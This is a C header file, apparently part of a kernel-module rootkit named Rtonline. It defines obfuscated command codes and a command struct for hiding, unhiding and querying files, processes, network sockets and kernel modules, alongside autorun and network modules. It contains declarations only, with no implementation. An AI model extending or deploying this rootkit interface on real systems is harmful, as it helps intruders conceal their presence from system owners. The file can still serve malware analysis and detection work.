#ifndef __RT_CMD__
#define __RT_CMD__

#include "Rtonline.h"


#define MAX_MODULE            0xFF

#define MODULE_GENERAL        0xFF // general
#define MODULE_MAIN           0x00 // main module
#define MODULE_WORK           0x01 // work module
#define MODULE_NETWORK        0x02 // network module
#define MODULE_HIDE           0x03 // hide module
#define MODULE_AUTORUN        0x04 // autorun module
#define MODULE_UI             0x05 // ui module

#define MAKE_CMD(m,c) ((1<<30)|((~((c&0x3F)^((c>>6)&0x3F)^\
(((c>>12)&0x0F)|((MODULE_##m<<4)&0x30))^((MODULE_##m>>2)&0x3F))&0x3F)\
<<24)|((MODULE_##m&0xFF)<<16)|c)

#define CHECK_CMD(cmd) ((((cmd>>31)&0x01)!=((cmd>>30)&0x01))&&\
(((cmd&0x3F)^((cmd>>6)&0x3F)^((cmd>>12)&0x3F)^((cmd>>18)&0x3F))==\
(~(cmd>>24)&0x3F)))

#define MAKE_REP(cmd) ((cmd) ^ 0xC0000000)
#define MOD_TYPE(x) (((x) >> 31) ? MODULE_UI : (((x) >> 16) & 0xFF))


#define CMD_HIDE_FILE         MAKE_CMD(HIDE, 0x0001) // hide file
#define CMD_HIDE_PROCESS      MAKE_CMD(HIDE, 0x0002) // hide process
#define CMD_HIDE_SOCKET       MAKE_CMD(HIDE, 0x0003) // hide socket
#define CMD_HIDE_KRNLMOD      MAKE_CMD(HIDE, 0x0004) // hide kernel module
#define CMD_UNHIDE_FILE       MAKE_CMD(HIDE, 0x1001) // unhide file
#define CMD_UNHIDE_PROCESS    MAKE_CMD(HIDE, 0x1002) // unhide process
#define CMD_UNHIDE_SOCKET     MAKE_CMD(HIDE, 0x1003) // unhide socket
#define CMD_UNHIDE_KRNLMOD    MAKE_CMD(HIDE, 0x1004) // unhide kernel module
#define CMD_QUERY_FILE        MAKE_CMD(HIDE, 0x2001) // query hidden files
#define CMD_QUERY_PROCESS     MAKE_CMD(HIDE, 0x2002) // query hidden processes
#define CMD_QUERY_SOCKET      MAKE_CMD(HIDE, 0x2003) // query hidden sockets
#define CMD_QUERY_KRNLMOD     MAKE_CMD(HIDE, 0x2004) // query hidden kernel module

//
// 异步处理消息标志
//
#define MODE_ASYC 0

//
// 同步处理消息标志
//
#define MODE_SYNC 1

#define CMD_DATA_SIZE 1
#define CMD_HEAD_SIZE 12

typedef struct _CMD {

    union {
        int idst; // id to indicate
        int mode; //
    };
    int type; // cmd type
    int size; // size of data
    int resv;

    union {
        int ndat;
        char data[CMD_DATA_SIZE]; // data
    };
} CMD, *PCMD;

typedef struct _INT_PKG {
    int size;
    int data[1];
} INT_PKG, *PINT_PKG;

typedef struct _STR_PKG {
    int size;
    char data[1];
} STR_PKG, *PSTR_PKG;



int check_files(char * filename);
int check_procs(unsigned int pid);
int check_ports(unsigned int port);

int proc_items(void);
int get_hide_proc(int i);

int lkm_mesg_proc(PCMD pCmd);

#endif // __RT_CMD__
